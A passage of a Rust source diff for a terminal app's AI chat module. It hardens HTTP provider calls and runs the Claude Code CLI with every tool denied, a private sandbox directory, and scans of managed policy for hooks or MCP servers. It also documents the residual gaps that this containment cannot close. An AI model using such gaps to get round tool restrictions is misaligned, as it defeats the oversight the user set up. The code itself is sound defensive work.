-        Some(k) => match saved_origin(&profile) {
+    // the one the key is bound to (e.g. switched to local Ollama), sending their
+    // terminal context to the old hosted origin instead would override an
+    // explicit privacy choice. A loopback selection goes ahead WITHOUT the key;
+    // anything else asks for the key to be re-saved.
+    let (kind, url, key) = match key {
+        None => (cfg.kind.clone(), caller_url, None),
+        Some(k) => match origin {
             Some((kind, base_url)) if !base_url.is_empty() => {
                 if same_origin(&kind, &base_url, &cfg.kind, &cfg.base_url) {
-                    (ProviderConfig { kind, base_url, model: cfg.model }, Some(k))
+                    let url = parse_base_url(&base_url).map_err(|e| {
+                        format!("The saved provider URL is not valid: {e} Re-save the key with a corrected URL.")
+                    })?;
+                    (kind, url, Some(k))
                 } else if caller_loopback {
-                    (cfg, None)
+                    (cfg.kind.clone(), caller_url, None)
                 } else {
-                    return emit_err(
-                        &app,
-                        format!(
-                            "The selected provider ({} at {}) is not the one the saved API key is bound to ({kind} at {base_url}). Re-enter the key for this provider in AI settings, or remove the saved key.",
-                            cfg.kind, cfg.base_url
-                        ),
-                    );
+                    return Err(format!(
+                        "The selected provider ({} at {}) is not the one the saved API key is bound to ({kind} at {base_url}). Re-enter the key for this provider in AI settings, or remove the saved key.",
+                        cfg.kind, cfg.base_url
+                    ));
                 }
             }
-            _ if caller_loopback => (cfg, None),
+            _ if caller_loopback => (cfg.kind.clone(), caller_url, None),
             _ => {
-                return emit_err(
-                    &app,
-                    "This provider's API key is not bound to a saved origin. Open AI settings and re-save the key to bind it before chatting.".into(),
-                );
+                return Err("This provider's API key is not bound to a saved origin. Open AI settings and re-save the key to bind it before chatting.".into());
             }
         },
     };
+
+    // Enforce HTTPS for non-loopback endpoints: an API key and the session
+    // context must never travel in cleartext to a remote host.
+    if url.scheme() != "https" && !is_loopback(&url) {
+        return Err("Refusing to send the session over plain HTTP to a non-local endpoint. Use an https:// URL (local Ollama / LM Studio on localhost are exempt).".into());
+    }
 
     // An empty turn (a reply that never streamed any text) is rejected by the
     // Anthropic API as a non-final message, which would break every later turn
@@ -391,37 +660,19 @@ pub async fn chat(
     let messages: Vec<ChatMessage> =
         messages.into_iter().filter(|m| !m.content.trim().is_empty()).collect();
 
-    // Enforce HTTPS for non-loopback endpoints: an API key and the session
-    // context must never travel in cleartext to a remote host. Local providers
-    // (Ollama / LM Studio on loopback) are exempt and may use plain HTTP.
-    if !cfg.base_url.starts_with("https://") && !is_loopback_url(&cfg.base_url) {
-        return emit_err(
-            &app,
-            "Refusing to send the API key over plain HTTP to a non-local endpoint. Use an https:// URL (local Ollama / LM Studio on localhost are exempt).".into(),
-        );
-    }
-
-    // Do NOT follow redirects: a 3xx from the endpoint could otherwise bounce
-    // the request — API key and session context included — to an arbitrary host,
-    // defeating the HTTPS-origin check above. An LLM completion endpoint has no
-    // legitimate reason to redirect.
-    let client = match reqwest::Client::builder()
-        .redirect(reqwest::redirect::Policy::none())
-        .build()
-    {
-        Ok(c) => c,
-        Err(e) => return emit_err(&app, e.to_string()),
-    };
+    // Do NOT follow redirects: a 3xx could bounce the request — API key and
+    // session context included — to an arbitrary host, defeating the origin
+    // checks above.
+    let client = http_client(&url)?;
 
     let system = format!("{SYSTEM_PROMPT}\n\n{system_context}");
-
-    let request = if cfg.kind == "anthropic" {
+    let request = if kind == "anthropic" {
         let msgs: Vec<_> = messages
             .iter()
             .map(|m| json!({ "role": m.role, "content": m.content }))
             .collect();
         let mut req = client
-            .post(format!("{}/v1/messages", cfg.base_url.trim_end_matches('/')))
+            .post(endpoint_url(&url, "v1/messages"))
             .header("anthropic-version", "2023-06-01")
             .json(&json!({
                 "model": cfg.model,
@@ -438,44 +689,45 @@ pub async fn chat(
         // OpenAI-compatible: system prompt travels as the first message.
         let mut msgs = vec![json!({ "role": "system", "content": system })];
         msgs.extend(messages.iter().map(|m| json!({ "role": m.role, "content": m.content })));
-        let mut req = client
-            .post(format!(
-                "{}/chat/completions",
-                cfg.base_url.trim_end_matches('/')
-            ))
-            .json(&json!({
-                "model": cfg.model,
-                "messages": msgs,
-                "stream": true,
-            }));
+        let mut req = client.post(endpoint_url(&url, "chat/completions")).json(&json!({
+            "model": cfg.model,
+            "messages": msgs,
+            "stream": true,
+        }));
         if let Some(k) = key.as_ref() {
             req = req.bearer_auth(k.as_str());
         }
         req
     };
-    // `key` (Zeroizing) drops after the request is built.
+    drop(key);
 
-    let response = match request.send().await {
-        Ok(r) => r,
-        Err(e) => return emit_err(&app, format!("request failed: {e}")),
+    // The overall budget in `start` covers everything; these give a clearer
+    // message for the two places a silent server most often stalls.
+    let response = match tokio::time::timeout(HEADERS_TIMEOUT, request.send()).await {
+        Err(_) => return Err("The provider did not respond (no response headers).".into()),
+        Ok(Err(e)) => return Err(format!("request failed: {e}")),
+        Ok(Ok(r)) => r,
     };
     if !response.status().is_success() {
         let status = response.status();
         // Provider error bodies are useful ("model not found", "invalid key")
-        // but can be huge HTML. response.text() would buffer ALL of it before we
-        // truncate; instead stream only until we have enough to show, then stop.
-        // Bytes first, decoded once, so a multi-byte character split across
-        // chunks is not shown as two replacement characters.
+        // but can be huge HTML. Stream only until there is enough to show,
+        // bytes first and decoded once (a split multi-byte char stays intact).
         let mut body: Vec<u8> = Vec::new();
         let mut es = response.bytes_stream();
-        while body.len() < 8192 {
-            match es.next().await {
-                Some(Ok(chunk)) => body.extend_from_slice(&chunk),
-                _ => break,
+        let _ = tokio::time::timeout(ERROR_BODY_TIMEOUT, async {
+            while body.len() < 8192 {
+                match es.next().await {
+                    Some(Ok(chunk)) => body.extend_from_slice(&chunk),
+                    _ => break,
+                }
             }
-        }
-        let snippet: String = String::from_utf8_lossy(&body).chars().take(400).collect();
-        return emit_err(&app, format!("{status}: {snippet}"));
+        })
+        .await;
+        // Not truncated here: `sanitize_error` scrubs the key out of the WHOLE
+        // text first and only then shortens it, so a key straddling the cut
+        // can never leave its first half behind.
+        return Err(format!("{status}: {}", String::from_utf8_lossy(&body)));
     }
 
     // SSE parsing shared by both dialects: split on newlines, take `data:`
@@ -483,31 +735,28 @@ pub async fn chat(
     //
     // Every accumulation here is bounded so a broken or hostile provider cannot
     // exhaust memory: a single line without a newline is capped, the total
-    // stream is capped, and a stall triggers an idle timeout rather than hanging
-    // forever.
+    // stream is capped, and a stall triggers an idle timeout.
     let mut stream = response.bytes_stream();
     // Raw bytes, split on b'\n' and decoded per complete line: a network chunk
-    // can end inside a multi-byte UTF-8 character (CJK, emoji, accents), and
-    // decoding chunk-by-chunk turned each such split into U+FFFD. A newline
-    // byte never occurs inside a multi-byte sequence, so lines are safe units.
+    // can end inside a multi-byte UTF-8 character, and decoding chunk-by-chunk
+    // turned each such split into U+FFFD.
     let mut buf: Vec<u8> = Vec::new();
     let mut total: u64 = 0;
     const MAX_SSE_LINE: usize = 1024 * 1024; // 1 MiB for one un-terminated line
     const MAX_TOTAL: u64 = 16 * 1024 * 1024; // 16 MiB whole response
-    const IDLE: std::time::Duration = std::time::Duration::from_secs(60);
 
     loop {
-        let bytes = match tokio::time::timeout(IDLE, stream.next()).await {
-            Err(_) => return emit_err(&app, "response stalled (idle timeout)".into()),
+        let bytes = match tokio::time::timeout(IDLE_TIMEOUT, stream.next()).await {
+            Err(_) => return Err("response stalled (idle timeout)".into()),
             Ok(None) => break,
             Ok(Some(Ok(bytes))) => bytes,
             // A dropped connection mid-answer is an error, not a clean finish:
             // otherwise a truncated (or empty) reply is presented as complete.
-            Ok(Some(Err(e))) => return emit_err(&app, format!("stream interrupted: {e}")),
+            Ok(Some(Err(e))) => return Err(format!("stream interrupted: {e}")),
         };
         total = total.saturating_add(bytes.len() as u64);
         if total > MAX_TOTAL {
-            return emit_err(&app, "response exceeded size limit".into());
+            return Err("response exceeded size limit".into());
         }
         buf.extend_from_slice(&bytes);
 
@@ -522,65 +771,742 @@ pub async fn chat(
             let Ok(v) = serde_json::from_str::<serde_json::Value>(data) else { continue };
 
             // In-band provider errors: Anthropic's `{"type":"error","error":{…}}`
-            // event (e.g. overloaded_error mid-stream) and OpenAI-compatible
-            // `{"error":{…}}`. Both carry no text delta, so without this check
-            // they were skipped and the run ended as a silent, empty success.
+            // event and OpenAI-compatible `{"error":{…}}`. Both carry no text
+            // delta, so without this check the run ended as a silent success.
             if let Some(err) = v.get("error").filter(|e| !e.is_null()) {
                 let msg = err
                     .get("message")
                     .and_then(|m| m.as_str())
                     .map(str::to_string)
                     .unwrap_or_else(|| err.to_string());
-                return emit_err(
-                    &app,
-                    format!("provider error: {}", msg.chars().take(400).collect::<String>()),
-                );
+                // Truncated only after scrubbing, in `sanitize_error`.
+                return Err(format!("provider error: {msg}"));
             }
 
-            let delta = if cfg.kind == "anthropic" {
-                v.get("delta")
-                    .and_then(|d| d.get("text"))
-                    .and_then(|t| t.as_str())
-                    .unwrap_or("")
-                    .to_string()
+            let delta = if kind == "anthropic" {
+                v.get("delta").and_then(|d| d.get("text")).and_then(|t| t.as_str())
             } else {
                 v.get("choices")
                     .and_then(|c| c.get(0))
                     .and_then(|c| c.get("delta"))
                     .and_then(|d| d.get("content"))
                     .and_then(|t| t.as_str())
-                    .unwrap_or("")
-                    .to_string()
             };
-
-            if !delta.is_empty() {
-                let _ = app.emit(
-                    &topic,
-                    AiEvent {
-                        run_id: run_id.clone(),
-                        delta,
-                        done: false,
-                        error: None,
-                    },
-                );
+            if let Some(delta) = delta.filter(|d| !d.is_empty()) {
+                emit(delta.to_string());
             }
         }
         // Checked after the complete lines are drained, so a chunk carrying
         // many short lines is not mistaken for one oversized line.
         if buf.len() > MAX_SSE_LINE {
-            return emit_err(&app, "response line exceeded size limit".into());
+            return Err("response line exceeded size limit".into());
         }
     }
+    Ok(())
+}
 
-    let _ = app.emit(
-        &topic,
-        AiEvent { run_id, delta: String::new(), done: true, error: None },
+/* ------------------------------------------------------------------- cli */
+
+/// Flags the lockdown cannot work without. A CLI missing any of them is not
+/// run at all.
+const REQUIRED_FLAGS: [&str; 4] = ["--tools", "--strict-mcp-config", "--mcp-config", "--setting-sources"];
+
+/// Built-in tools denied again by name, on top of `--tools ""`.
+const DENY_TOOLS: &str = "Bash,Edit,Write,MultiEdit,NotebookEdit,WebFetch,WebSearch,Read,Glob,Grep,Task";
+
+/// Optional hardening flags, used when the installed CLI has them.
+#[derive(Debug, Clone, Default, PartialEq)]
+struct CliFeatures {
+    no_session_persistence: bool,
+    disable_slash_commands: bool,
+    permission_prompts: bool,
+    disallowed_tools: bool,
+}
+
+/// `flag` appears in `help` as a whole option name (not inside a longer one).
+fn has_flag(help: &str, flag: &str) -> bool {
+    let is_name = |b: u8| b.is_ascii_alphanumeric() || b == b'-' || b == b'_';
+    let bytes = help.as_bytes();
+    help.match_indices(flag).any(|(i, _)| {
+        (i == 0 || !is_name(bytes[i - 1])) && bytes.get(i + flag.len()).is_none_or(|&b| !is_name(b))
+    })
+}
+
+/// What `claude --help` offers, or the required flags it lacks.
+fn parse_cli_features(help: &str) -> Result<CliFeatures, Vec<&'static str>> {
+    let missing: Vec<&'static str> = REQUIRED_FLAGS.iter().copied().filter(|f| !has_flag(help, f)).collect();
+    if !missing.is_empty() {
+        return Err(missing);
+    }
+    Ok(CliFeatures {
+        no_session_persistence: has_flag(help, "--no-session-persistence"),
+        disable_slash_commands: has_flag(help, "--disable-slash-commands"),
+        permission_prompts: has_flag(help, "--permission-prompts"),
+        disallowed_tools: has_flag(help, "--disallowedTools"),
+    })
+}
+
+/// The locked-down argument list: print mode, no built-in tools, only the
+/// (empty) MCP config at `mcp_config`, no settings sources (so none of the
+/// user's hooks, allow rules or plugins), no saved session. The prompt goes in
+/// over stdin, never argv, so no quoting surface exists whatever the
+/// transcript contains.
+fn cli_args(f: &CliFeatures, mcp_config: &Path) -> Vec<OsString> {
+    let mut a: Vec<OsString> = ["-p", "--output-format", "text", "--tools", ""]
+        .iter()
+        .map(OsString::from)
+        .collect();
+    a.push("--strict-mcp-config".into());
+    a.push("--mcp-config".into());
+    a.push(mcp_config.as_os_str().to_owned());
+    a.push("--setting-sources".into());
+    a.push("".into());
+    if f.no_session_persistence {
+        a.push("--no-session-persistence".into());
+    }
+    if f.disable_slash_commands {
+        a.push("--disable-slash-commands".into());
+    }
+    if f.permission_prompts {
+        // Anything that would ask for permission is denied, not prompted.
+        a.push("--permission-prompts".into());
+        a.push("none".into());
+    }
+    if f.disallowed_tools {
+        // Last: the option takes a variable number of values.
+        a.push("--disallowedTools".into());
+        a.push(DENY_TOOLS.into());
+    }
+    a
+}
+
+#[cfg(windows)]
+const CLAUDE_NAMES: &[&str] = &["claude.exe", "claude.cmd"];
+#[cfg(not(windows))]
+const CLAUDE_NAMES: &[&str] = &["claude"];
+
+/// Where installers put `claude`. A Finder/Dock launch inherits launchd's
+/// PATH (`/usr/bin:/bin:/usr/sbin:/sbin`), and a desktop launcher on Linux
+/// often lacks `~/.local/bin`, so PATH alone misses a working install.
+fn well_known_dirs(home: Option<&Path>) -> Vec<PathBuf> {
+    let mut dirs = Vec::new();
+    #[cfg(not(windows))]
+    {
+        if let Some(h) = home {
+            dirs.push(h.join(".local/bin"));
+            dirs.push(h.join(".claude/local"));
+            dirs.push(h.join(".npm-global/bin"));
+            dirs.push(h.join(".bun/bin"));
+        }
+        dirs.push(PathBuf::from("/opt/homebrew/bin"));
+        dirs.push(PathBuf::from("/usr/local/bin"));
+    }
+    #[cfg(windows)]
+    {
+        if let Some(h) = home {
+            dirs.push(h.join(".local").join("bin"));
+        }
+        if let Some(appdata) = std::env::var_os("APPDATA") {
+            dirs.push(PathBuf::from(appdata).join("npm"));
+        }
+    }
+    dirs
+}
+
+fn is_executable(p: &Path) -> bool {
+    let Ok(meta) = std::fs::metadata(p) else { return false };
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        meta.is_file() && meta.permissions().mode() & 0o111 != 0
+    }
+    #[cfg(not(unix))]
+    {
+        meta.is_file()
+    }
+}
+
+fn find_in(dirs: &[PathBuf]) -> Option<PathBuf> {
+    dirs.iter()
+        .flat_map(|d| CLAUDE_NAMES.iter().map(move |n| d.join(n)))
+        .find(|p| is_executable(p))
+}
+
+fn path_dirs() -> Vec<PathBuf> {
+    std::env::var_os("PATH").map(|p| std::env::split_paths(&p).collect()).unwrap_or_default()
+}
+
+/// Ask the user's login shell, which runs their profile, where `claude` is.
+#[cfg(unix)]
+async fn login_shell_lookup() -> Option<PathBuf> {
+    let shell = std::env::var_os("SHELL").filter(|s| !s.is_empty()).unwrap_or_else(|| "/bin/sh".into());
+    let mut cmd = tokio::process::Command::new(shell);
+    cmd.args(["-l", "-c", "command -v claude"])
+        .stdin(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .kill_on_drop(true);
+    let out = tokio::time::timeout(Duration::from_secs(5), cmd.output()).await.ok()?.ok()?;
+    // A profile can print banners; the answer is the last absolute path.
+    String::from_utf8_lossy(&out.stdout)
+        .lines()
+        .rev()
+        .map(str::trim)
+        .find(|l| l.starts_with('/'))
+        .map(PathBuf::from)
+        .filter(|p| is_executable(p))
+}
+
+#[cfg(not(unix))]
+async fn login_shell_lookup() -> Option<PathBuf> {
+    None
+}
+
+/// Absolute path of the `claude` executable: PATH, then the installers'
+/// usual directories, then the login shell. Cached while it stays valid.
+async fn resolve_claude() -> Option<PathBuf> {
+    static CACHE: Mutex<Option<PathBuf>> = Mutex::new(None);
+    if let Some(p) = CACHE.lock().unwrap_or_else(|e| e.into_inner()).clone() {
+        if is_executable(&p) {
+            return Some(p);
+        }
+    }
+    let home = crate::utils::platform::home_dir();
+    let found = match find_in(&path_dirs()).or_else(|| find_in(&well_known_dirs(home.as_deref()))) {
+        Some(p) => Some(p),
+        None => login_shell_lookup().await,
+    };
+    *CACHE.lock().unwrap_or_else(|e| e.into_inner()) = found.clone();
+    found
+}
+
+/// PATH for the child: claude's own directory first (an npm install needs the
+/// `node` that sits beside it), then the inherited PATH, then the usual dirs.
+fn child_path(claude: &Path) -> OsString {
+    let mut dirs: Vec<PathBuf> = claude.parent().map(Path::to_path_buf).into_iter().collect();
+    let home = crate::utils::platform::home_dir();
+    for d in path_dirs().into_iter().chain(well_known_dirs(home.as_deref())) {
+        if !dirs.contains(&d) {
+            dirs.push(d);
+        }
+    }
+    std::env::join_paths(dirs).unwrap_or_else(|_| std::env::var_os("PATH").unwrap_or_default())
+}
+
+/// A fresh private directory for one CLI run: an empty `work/` that becomes
+/// the CLI's working directory (so no project settings, CLAUDE.md or files are
+/// "in the project"), and the empty MCP config beside it. Removed on drop.
+struct Sandbox {
+    root: PathBuf,
+}
+
+impl Sandbox {
+    fn new() -> std::io::Result<Self> {
+        let root = std::env::temp_dir().join(format!("hawser-ai-{}", crate::utils::artifacts::random_hex(8)));
+        let mut b = std::fs::DirBuilder::new();
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::DirBuilderExt;
+            b.mode(0o700);
+        }
+        // create, not create_all: a pre-existing (planted) directory is refused.
+        b.create(&root)?;
+        let sandbox = Self { root };
+        b.create(sandbox.work())?;
+        std::fs::write(sandbox.mcp_config(), br#"{"mcpServers":{}}"#)?;
+        Ok(sandbox)
+    }
+
+    fn work(&self) -> PathBuf {
+        self.root.join("work")
+    }
+
+    fn mcp_config(&self) -> PathBuf {
+        self.root.join("mcp.json")
+    }
+}
+
+impl Drop for Sandbox {
+    fn drop(&mut self) {
+        let _ = std::fs::remove_dir_all(&self.root);
+    }
+}
+
+fn hide_console(cmd: &mut tokio::process::Command) {
+    #[cfg(windows)]
+    {
+        cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
+    }
+    #[cfg(not(windows))]
+    let _ = cmd;
+}
+
+/// Which hardening flags this CLI offers, failing closed when a required one
+/// is missing. Cached per executable path (only on success, so an upgrade
+/// after a refusal is picked up).
+async fn cli_features(claude: &Path, path_env: &OsString, cwd: &Path) -> Result<CliFeatures, String> {
+    static CACHE: Mutex<Option<(PathBuf, CliFeatures)>> = Mutex::new(None);
+    if let Some((p, f)) = CACHE.lock().unwrap_or_else(|e| e.into_inner()).clone() {
+        if p == claude {
+            return Ok(f);
+        }
+    }
+    let mut cmd = tokio::process::Command::new(claude);
+    cmd.arg("--help")
+        .current_dir(cwd)
+        .env("PATH", path_env)
+        .stdin(std::process::Stdio::null())
+        .kill_on_drop(true);
+    hide_console(&mut cmd);
+    let out = tokio::time::timeout(Duration::from_secs(20), cmd.output())
+        .await
+        .map_err(|_| "`claude --help` did not finish; cannot verify the CLI can be locked down.".to_string())?
+        .map_err(|e| format!("could not start the Claude Code CLI ({}): {e}", claude.display()))?;
+    let help = format!("{}{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr));
+    match parse_cli_features(&help) {
+        Ok(f) => {
+            *CACHE.lock().unwrap_or_else(|e| e.into_inner()) = Some((claude.to_path_buf(), f.clone()));
+            Ok(f)
+        }
+        Err(missing) => Err(format!(
+            "This Claude Code CLI does not support {}, which Hawser needs to run it with every tool disabled. Update Claude Code (`claude update`) or choose another provider.",
+            missing.join(", ")
+        )),
+    }
+}
+
+fn cli_prompt(system_context: &str, messages: &[ChatMessage]) -> String {
+    let mut prompt = format!("{SYSTEM_PROMPT}\n\n{system_context}\n\n");
+    for m in messages {
+        let who = if m.role == "user" { "User" } else { "Assistant" };
+        prompt.push_str(&format!("{who}: {}\n\n", m.content));
+    }
+    prompt.push_str("Assistant:");
+    prompt
+}
+
+/// Read a child stream to EOF, keeping at most `cap` bytes. It keeps reading
+/// past the cap so the child never blocks on a full pipe.
+async fn drain<R: tokio::io::AsyncRead + Unpin>(r: Option<R>, cap: usize) -> Vec<u8> {
+    use tokio::io::AsyncReadExt;
+    let mut out = Vec::new();
+    let Some(mut r) = r else { return out };
+    let mut buf = [0u8; 8192];
+    loop {
+        match r.read(&mut buf).await {
+            Ok(0) | Err(_) => break,
+            Ok(n) => {
+                let keep = cap.saturating_sub(out.len()).min(n);
+                out.extend_from_slice(&buf[..keep]);
+            }
+        }
+    }
+    out
+}
+
+async fn run_cli(emit: &(dyn Fn(String) + Sync), prompt: String) -> Result<(), String> {
+    use tokio::io::AsyncWriteExt;
+    let claude = resolve_claude().await.ok_or_else(|| {
+        "Could not find the Claude Code CLI (`claude`) on PATH, in ~/.local/bin, /opt/homebrew/bin or /usr/local/bin, or via your login shell. Is Claude Code installed?".to_string()
+    })?;
+    check_managed_policy().await?;
+    let path_env = child_path(&claude);
+    let sandbox = Sandbox::new().map_err(|e| format!("could not create a private working directory: {e}"))?;
+    let features = cli_features(&claude, &path_env, &sandbox.work()).await?;
+
+    let mut cmd = tokio::process::Command::new(&claude);
+    cmd.args(cli_args(&features, &sandbox.mcp_config()))
+        .current_dir(sandbox.work())
+        .env("PATH", &path_env)
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        // Timeout or cancel drops the future, and with it the child: killed,
+        // not left running as an orphan.
+        .kill_on_drop(true);
+    hide_console(&mut cmd);
+    let mut child = cmd
+        .spawn()
+        .map_err(|e| format!("could not start the Claude Code CLI ({}): {e}", claude.display()))?;
+
+    // The prompt is written while stdout and stderr are drained: writing it
+    // first could block on a full stdin pipe while the child blocks on a full
+    // stdout pipe.
+    let stdin = child.stdin.take();
+    let write = async move {
+        if let Some(mut s) = stdin {
+            let _ = s.write_all(prompt.as_bytes()).await;
+            let _ = s.shutdown().await;
+            // Dropping stdin closes it; claude -p reads to EOF then answers.
+        }
+    };
+    let (_, out, err, status) = tokio::join!(
+        write,
+        drain(child.stdout.take(), 4 * 1024 * 1024),
+        drain(child.stderr.take(), 64 * 1024),
+        child.wait(),
     );
+    let status = status.map_err(|e| format!("claude CLI failed: {e}"))?;
+    if status.success() {
+        emit(String::from_utf8_lossy(&out).trim().to_string());
+        return Ok(());
+    }
+    Err(cli_failure(&status.to_string(), &String::from_utf8_lossy(&err)))
+}
+
+/// The message for a failed CLI run. Nothing from stderr is shown, not even a
+/// redacted excerpt: it can carry diagnostics from an inherited credential or
+/// provider configuration (an `ANTHROPIC_API_KEY` echoed in an auth error, a
+/// proxy URL with a password), and no redaction heuristic catches every
+/// secret shape. stderr only picks which generic hint to give.
+fn cli_failure(status: &str, stderr: &str) -> String {
+    let err = stderr.trim();
+    // The most common failure is an unauthenticated CLI, which often exits
+    // non-zero with little or no stderr. Give the actual fix rather than a
+    // bare "exited 1".
+    let lower = err.to_lowercase();
+    let looks_unauthed = err.is_empty() || lower.contains("login") || lower.contains("auth") || lower.contains("not logged");
+    if looks_unauthed {
+        format!("Claude CLI exited {status}. It may not be logged in — run `claude` in a terminal once to authenticate, then retry.")
+    } else {
+        format!("Claude CLI exited {status}. Run `claude` in a terminal to see the error.")
+    }
+}
+
+/* ------------------------------------------------------- managed policy */
+
+// Residual limit of the CLI lockdown, documented here because no flag closes
+// it. `--tools ""`, `--strict-mcp-config` with an empty config and
+// `--setting-sources ""` remove the built-in tools and every user, project and
+// local setting (their hooks and plugins included). They do NOT remove
+// MANAGED settings: Anthropic documents that managed policy (the system
+// managed-settings.json and its managed-settings.d drop-ins, an MDM plist or
+// HKLM/HKCU registry value, and server-managed settings fetched from
+// claude.ai) applies above every flag. `--safe-mode` and `--restricted` say so
+// explicitly, and `--bare` is not an option: it stops OAuth from being read,
+// which is the whole point of this provider (the user's subscription). A
+// managed `SessionStart` hook would therefore run a local command during a
+// Hawser request, and a deployed `managed-mcp.json` makes the CLI load (or
+// refuse to start without) its servers.
+//
+// So before every run the documented on-disk managed sources are inspected,
+// and the CLI is refused when any of them defines hooks or MCP servers, or
+// cannot be read (fail closed). What this cannot see: server-managed settings,
+// which the CLI fetches from claude.ai at startup and which exist nowhere on
+// disk beforehand; command-running keys other than hooks (`apiKeyHelper`,
+// `awsAuthRefresh` and the like are credential helpers an organisation deploys
+// for authentication, and are left alone); and a policy deployed between this
+// check and the CLI's own read of it. Organisations that push hooks from the
+// claude.ai console should use an HTTP provider instead.
+
+/// Managed-policy keys whose presence means the CLI would run something
+/// beyond a text completion.
+const POLICY_KEYS: [(&str, &str); 2] = [("hooks", "hooks"), ("managedMcpServers", "MCP servers")];
+
+/// Whether a JSON value is "set" in a way that does something: a non-empty
+/// object or array, a non-empty string, or `true`.
+fn json_is_set(v: &serde_json::Value) -> bool {
+    match v {
+        serde_json::Value::Object(m) => !m.is_empty(),
+        serde_json::Value::Array(a) => !a.is_empty(),
+        serde_json::Value::String(s) => !s.trim().is_empty(),
+        serde_json::Value::Bool(b) => *b,
+        serde_json::Value::Number(_) => true,
+        serde_json::Value::Null => false,
+    }
+}
+
+/// What a managed settings document enables that the lockdown cannot remove.
+fn policy_blockers(doc: &serde_json::Value) -> Vec<&'static str> {
+    POLICY_KEYS
+        .iter()
+        .filter(|(k, _)| doc.get(*k).is_some_and(json_is_set))
+        .map(|(_, what)| *what)
+        .collect()
+}
+
+/// A managed MCP file defines servers when its `mcpServers` is non-empty (or
+/// it is not the documented shape, which is treated as defining some).
+fn mcp_file_defines_servers(doc: &serde_json::Value) -> bool {
+    match doc.get("mcpServers") {
+        Some(v) => json_is_set(v),
+        None => doc.as_object().is_none_or(|m| !m.is_empty()),
+    }
+}
+
+/// Inspect one managed-settings directory (file-based delivery): the
+/// settings file, its drop-ins and the managed MCP file. Err names what would
+/// stay active, or which document could not be read.
+fn scan_managed_dir(dir: &Path) -> Result<(), String> {
+    let read = |p: &Path| -> Result<Option<serde_json::Value>, String> {
+        match std::fs::read(p) {
+            Ok(bytes) => serde_json::from_slice::<serde_json::Value>(&bytes)
+                .map(Some)
+                .map_err(|_| format!("{} could not be parsed", p.display())),
+            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
+            Err(e) => Err(format!("{} could not be read ({e})", p.display())),
+        }
+    };
+    let mut docs: Vec<(PathBuf, serde_json::Value)> = Vec::new();
+    let main = dir.join("managed-settings.json");
+    if let Some(v) = read(&main)? {
+        docs.push((main, v));
+    }
+    let dropins = dir.join("managed-settings.d");
+    match std::fs::read_dir(&dropins) {
+        Ok(rd) => {
+            for e in rd {
+                let e = e.map_err(|e| format!("{} could not be read ({e})", dropins.display()))?;
+                let p = e.path();
+                if p.extension().is_some_and(|x| x == "json") {
+                    if let Some(v) = read(&p)? {
+                        docs.push((p, v));
+                    }
+                }
+            }
+        }
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
+        Err(e) => return Err(format!("{} could not be read ({e})", dropins.display())),
+    }
+    for (p, doc) in &docs {
+        let what = policy_blockers(doc);
+        if !what.is_empty() {
+            return Err(format!("{} defines {}", p.display(), what.join(" and ")));
+        }
+    }
+    let mcp = dir.join("managed-mcp.json");
+    if let Some(v) = read(&mcp)? {
+        if mcp_file_defines_servers(&v) {
+            return Err(format!("{} defines MCP servers", mcp.display()));
+        }
+    }
+    Ok(())
+}
+
+/// The system directory of file-based managed settings on this OS.
+fn managed_dir() -> PathBuf {
+    #[cfg(target_os = "macos")]
+    {
+        PathBuf::from("/Library/Application Support/ClaudeCode")
+    }
+    #[cfg(windows)]
+    {
+        let pf = std::env::var_os("ProgramFiles").unwrap_or_else(|| r"C:\Program Files".into());
+        PathBuf::from(pf).join("ClaudeCode")
+    }
+    #[cfg(all(unix, not(target_os = "macos")))]
+    {
+        PathBuf::from("/etc/claude-code")
+    }
+}
+
+/// MDM delivery on macOS: the `com.anthropic.claudecode` managed preferences
+/// domain, machine-wide or per user, read through `plutil` (it may be binary).
+#[cfg(target_os = "macos")]
+async fn scan_os_policy() -> Result<(), String> {
+    let mut plists = vec![PathBuf::from("/Library/Managed Preferences/com.anthropic.claudecode.plist")];
+    if let Some(user) = std::env::var_os("USER").filter(|u| !u.is_empty()) {
+        plists.push(PathBuf::from("/Library/Managed Preferences").join(user).join("com.anthropic.claudecode.plist"));
+    }
+    for p in plists {
+        if std::fs::symlink_metadata(&p).is_err() {
+            continue;
+        }
+        let mut cmd = tokio::process::Command::new("/usr/bin/plutil");
+        cmd.arg("-convert").arg("json").arg("-o").arg("-").arg(&p).stdin(std::process::Stdio::null()).kill_on_drop(true);
+        let out = tokio::time::timeout(Duration::from_secs(10), cmd.output())
+            .await
+            .map_err(|_| format!("{} could not be read", p.display()))?
+            .map_err(|e| format!("{} could not be read ({e})", p.display()))?;
+        let doc: serde_json::Value = serde_json::from_slice(&out.stdout)
+            .map_err(|_| format!("{} could not be parsed", p.display()))?;
+        let what = policy_blockers(&doc);
+        if !what.is_empty() {
+            return Err(format!("the managed profile {} defines {}", p.display(), what.join(" and ")));
+        }
+    }
+    Ok(())
+}
+
+/// Registry delivery on Windows: the `Settings` value under
+/// `HKLM\SOFTWARE\Policies\ClaudeCode`, and its HKCU fallback.
+#[cfg(windows)]
+async fn scan_os_policy() -> Result<(), String> {
+    for root in ["HKLM", "HKCU"] {
+        let key = format!(r"{root}\SOFTWARE\Policies\ClaudeCode");
+        let mut cmd = tokio::process::Command::new("reg");
+        cmd.args(["query", &key, "/v", "Settings"]).stdin(std::process::Stdio::null()).kill_on_drop(true);
+        hide_console(&mut cmd);
+        let out = tokio::time::timeout(Duration::from_secs(10), cmd.output())
+            .await
+            .map_err(|_| format!("{key} could not be read"))?
+            .map_err(|e| format!("{key} could not be read ({e})"))?;
+        if !out.status.success() {
+            continue; // no such value
+        }
+        let text = String::from_utf8_lossy(&out.stdout);
+        let json = text
+            .lines()
+            .find_map(|l| l.split_once("REG_EXPAND_SZ").or_else(|| l.split_once("REG_SZ")).map(|(_, v)| v.trim().to_string()))
+            .ok_or_else(|| format!("{key}\\Settings could not be parsed"))?;
+        let doc: serde_json::Value =
+            serde_json::from_str(&json).map_err(|_| format!("{key}\\Settings could not be parsed"))?;
+        let what = policy_blockers(&doc);
+        if !what.is_empty() {
